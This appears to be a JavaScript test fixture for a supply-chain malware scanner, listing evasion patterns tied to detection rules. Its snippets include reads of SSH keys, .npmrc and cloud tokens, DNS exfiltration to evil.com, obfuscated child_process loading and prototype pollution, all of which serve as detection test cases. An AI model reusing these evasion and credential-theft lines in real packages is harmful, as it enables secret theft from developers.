// Tests for previously-bypassed patterns

// Bracket notation — SC-001b should catch these
var token = process["env"]["NPM_TOKEN"];
var key = process["env"]["AWS_SECRET_KEY"];

// Indirect eval via global — SC-014
globalThis["eval"]("malicious()");
window["eval"]("payload");

// ESM dynamic import — SC-004b
import(someVar).then(m => m.default());

// child_process via import — SC-002b
// import { exec } from 'child_process'

// VM sandbox escape — SC-008
const vm = require("vm");
vm.runInNewContext("process.exit(1)", {});

// WebAssembly — SC-009
WebAssembly.instantiate(wasmBuffer);

// Prototype pollution — SC-010
obj.__proto__.isAdmin = true;
obj["__proto__"]["isAdmin"] = true;
obj.constructor.prototype.isAdmin = true;

// Sensitive file paths — SC-011
const sshKey = fs.readFileSync("/root/.ssh/id_rsa");
const npmrc = fs.readFileSync("~/.npmrc");

// DNS exfil — SC-012
const dns = require("dns");
dns.resolve("data.evil.com");

// Crypto decipher (event-stream pattern) — SC-013
const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);

// Buffer.from base64 — deobfuscator should decode this
var cp = require(Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString());

// Mixed hex escapes — deobfuscator should handle partial hex
var url = "\x68\x74\x74\x70\x73://evil.com/\x73\x74\x65\x61\x6c";

// ES6 unicode — deobfuscator should handle
var cmd = "\u{63}\u{75}\u{72}\u{6c}";
